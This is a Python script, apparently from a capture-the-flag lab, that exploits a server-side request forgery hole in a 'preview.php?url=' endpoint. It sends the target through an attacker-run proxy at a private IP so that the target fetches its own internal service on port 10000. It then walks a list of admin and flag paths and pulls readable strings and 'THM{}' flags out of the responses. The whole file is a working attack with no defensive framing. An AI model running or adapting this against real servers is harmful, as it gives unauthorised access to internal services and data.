import requests, urllib.parse, re

attacker = 'http://192.168.223.117:8000'
base = 'http://10.82.159.192/preview.php?url='

def fetch_proxy(path):
    target = 'http://127.0.0.1:10000' + path
    proxy_url = attacker + '/proxy?to=' + urllib.parse.quote(target, safe='')
    r = requests.get(base + urllib.parse.quote(proxy_url, safe=''), timeout=10)
    return r.text

paths = ['/admin', '/dashboard', '/flag', '/customapi', '/api/flag',
         '/api/admin', '/admin/flag', '/secret', '/internal']

for p in paths:
    body = fetch_proxy(p)
    # Extract text content from Next.js inline script data
    # Look for THM flags first
    flags = re.findall(r'THM\{[^}]+\}', body)
    if flags:
        print('[FLAG!!!] ' + p + ': ' + str(flags))
        continue

    # Extract readable strings from __next_f push data
    texts = re.findall(r'"([^"]{10,200})"', body)
    interesting = [t for t in texts if not t.startswith('_next') and not t.startswith('http')
                   and not any(x in t for x in ['crossOrigin', 'charSet', 'fetchPriority', 'preload', 'stylesheet'])]

    is404 = 'noindex' in body or 'not-found' in body.lower() or 'Not Found' in body
    print('[' + str(len(body)) + 'b' + (' 404?' if is404 else ' HIT') + '] ' + p)
    for t in interesting[:8]:
        print('  ' + t)
    print()
